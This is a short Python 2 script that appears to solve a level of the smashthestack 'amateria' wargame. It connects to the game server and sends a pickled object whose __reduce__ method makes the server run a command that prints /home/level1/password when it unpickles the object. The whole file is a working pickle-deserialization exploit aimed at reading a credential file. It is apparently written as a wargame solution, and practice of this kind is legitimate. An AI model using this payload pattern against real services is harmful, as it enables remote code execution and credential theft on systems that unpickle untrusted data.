import cPickle
import subprocess
import socket
import os

class Exploit(object):
	def __reduce__(self):
		return(subprocess.call, (('cat', '/home/level1/password'), 0, None, 4, 4, 4))

def attack():
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	addr_info=socket.getaddrinfo('amateria.smashthestack.org', 54321)[-1][4]
	sock.connect(addr_info)
	data=sock.recv(1024)
	print("---- RECEIVED DURING CONNECTION SETUP ---- ")
	if data:
		print(data)
	sock.send(cPickle.dumps(Exploit()))
	data=sock.recv(1024)
	print("---- RECEIVED ----")
	print data

if __name__ == '__main__':
	attack()
	

